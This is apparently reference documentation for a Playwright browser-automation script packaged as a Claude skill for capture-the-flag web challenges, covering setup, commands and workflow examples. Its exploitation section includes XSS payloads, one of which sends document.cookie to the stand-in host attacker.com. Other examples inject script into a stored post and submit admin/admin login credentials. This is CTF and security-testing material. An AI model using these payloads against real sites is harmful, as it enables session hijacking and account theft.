# Browser Automation — API Reference

Full command details, options, installation, troubleshooting, and usage examples
for `browser_ctl.py`.

## Quick Start

```bash
# Take a screenshot of a target
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  screenshot --url "http://target.com/page" --output page.png

# Execute JavaScript and get result
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  evaluate --url "http://target.com" --script "document.cookie"

# Test XSS payload in isolated context
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  xss-test --url "http://target.com/search?q=<script>alert(1)</script>"

# Extract DOM after JavaScript execution
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  extract --url "http://target.com" --selector "#flag"

# Automate form submission
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  form --url "http://target.com/login" \
  --fields '{"username":"admin","password":"admin"}' \
  --submit "button[type=submit]"
```

## Installation

### Requirements

**No GUI / desktop environment needed** - Playwright runs headless on pure CLI servers.

### System Dependencies (Linux)

Chromium requires these system libraries even without a display:

```bash
# Install Playwright and browsers
pip3 install playwright
playwright install chromium  # Only install Chrome
# OR
playwright install  # Install all browsers (Chrome, Firefox, WebKit)
```

To install Chromium system dependencies, the recommended approach:

```bash
PLAYWRIGHT_BIN="$(command -v playwright)"
echo "$PLAYWRIGHT_BIN"
sudo "$PLAYWRIGHT_BIN" install-deps chromium
```

Some environments don't inherit the user PATH under `sudo`, so resolve the
executable path first instead of writing `sudo playwright ...`.

Manual installation alternative:

```bash
sudo apt-get update
sudo apt-get install -y \
  libgbm1 \
  libnss3 \
  libatk-bridge2.0-0 \
  libatk1.0-0 \
  libcups2 \
  libdrm2 \
  libxcomposite1 \
  libxdamage1 \
  libxfixes3 \
  libxrandr2 \
  libxkbcommon0 \
  libpango-1.0-0 \
  libcairo2 \
  libatspi2.0-0 \
  libgtk-3-0
```

### Verify Installation

```bash
python3 -c "from playwright.sync_api import sync_playwright; print('Playwright OK')"
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py check
```

## Command Reference

### Commands

| Command | Description |
|---------|-------------|
| `screenshot` | Capture page screenshot |
| `evaluate` | Execute JavaScript and return result |
| `extract` | Extract DOM content by selector |
| `navigate` | Navigate to URL with options |
| `form` | Fill and submit forms |
| `xss-test` | Test XSS payloads with alert/dialog capture |
| `chain` | Execute multiple actions in sequence |
| `csp-test` | Test Content Security Policy restrictions |
| `request` | Intercept and modify requests |
| `storage` | View/modify localStorage/sessionStorage |

### Common Options

| Option | Description |
|--------|-------------|
| `--url` | Target URL |
| `--output` | Output file path |
| `--selector` | CSS selector for element targeting |
| `--timeout` | Timeout in milliseconds (default: 30000) |
| `--headless` | Run in headless mode (default: true) |
| `--cookies` | JSON string of cookies to set |
| `--headers` | Custom HTTP headers |
| `--proxy` | Proxy URL (e.g., http://127.0.0.1:8080) |
| `--user-agent` | Custom user agent string |
| `--viewport` | Viewport size (e.g., 1920x1080) |
| `--wait-for` | Wait for selector/text/timeout |
| `--capture-console` | Capture browser console logs |
| `--capture-network` | Capture network requests |

## Security Considerations

### XSS Testing Safety

- Always use `--headless=true` for automated testing
- Payloads execute in isolated browser context
- Alert dialogs are automatically handled
- Console output is captured for debugging

### Request Interception

```bash
# Intercept and modify requests
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  request \
  --url "http://target.com" \
  --intercept "**/api/**" \
  --modify '{"headers":{"X-Custom":"value"}}'
```

### Sandbox Escape Prevention

When testing untrusted payloads:
- Use separate browser context per test
- Clear cookies/storage between tests
- Run in restricted network environment
- Monitor resource usage

## Integration with CTF Workflow

### During Recon

```bash
# Screenshot all discovered endpoints
for url in $(cat urls.txt); do
  python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
    screenshot --url "$url" --output "screens/$(basename $url).png"
done
```

### During Exploitation

```bash
# Test reflected XSS
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  xss-test \
  --url "http://target.com/echo?input=<script>fetch('http://attacker.com/?c='+document.cookie)</script>" \
  --capture-network

# Test stored XSS (with bot simulation)
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  chain \
  --steps '[
    {"action":"goto","url":"http://target.com/post"},
    {"action":"fill","selector":"#content","value":"<script>alert(1)</script>"},
    {"action":"click","selector":"#submit"},
    {"action":"wait","ms":1000},
    {"action":"goto","url":"http://target.com/view"},
    {"action":"wait","ms":3000}
  ]' \
  --capture-console
```

### For DOM-based Challenges

```bash
# Extract flag from JavaScript-rendered content
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  extract \
  --url "http://target.com/challenge" \
  --script "
    // Wait for custom decryption
    await new Promise(r => setTimeout(r, 2000));
    return document.querySelector('#flag').innerText;
  "
```

## Troubleshooting

### Headless Mode (No GUI Required)

Playwright defaults to **headless mode** — no display, X11, or desktop needed.

```bash
# Works fine on a pure SSH server
python3 browser_ctl.py screenshot --url "http://target.com" --output /tmp/out.png
```

### Server Deployment

On Linux servers (cloud, Docker, WSL), install system libraries:

```bash
# Ubuntu/Debian
sudo apt-get install libgbm1 libnss3 libatk-bridge2.0-0 libxkbcommon0 libgtk-3-0

# Or use Playwright's installer
playwright install-deps chromium
```

### Docker

```bash
# Use official Playwright image (all dependencies included)
docker run -it --rm --ipc=host mcr.microsoft.com/playwright:v1.40.0-jammy \
  python3 -m playwright screenshot https://example.com /tmp/example.png
```

### Browser Launch Fails

```bash
# Install missing system dependencies
playwright install-deps chromium

# Check for conflicting Chrome instances
pkill -f chromium

# Use specific executable path
export PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH=/usr/bin/chromium
```

### Timeout Issues

```bash
# Increase timeout for slow-loading pages
--timeout 60000

# Wait for specific element instead
--wait-for-selector "#content"
```

### SSL Certificate Errors

```bash
# Ignore HTTPS errors (CTF labs often use self-signed certs)
--ignore-https-errors
```

## Maintenance

Keep Playwright updated:
```bash
pip3 install --upgrade playwright
playwright install chromium
```

For CTF challenges requiring specific browser versions, use Docker:
```bash
docker run -it --rm --ipc=host mcr.microsoft.com/playwright:v1.40.0-jammy
```

## External References

- [Playwright Documentation](https://playwright.dev/python/)
- [CTF XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [DOM Clobbering Techniques](https://domclob.xyz/)
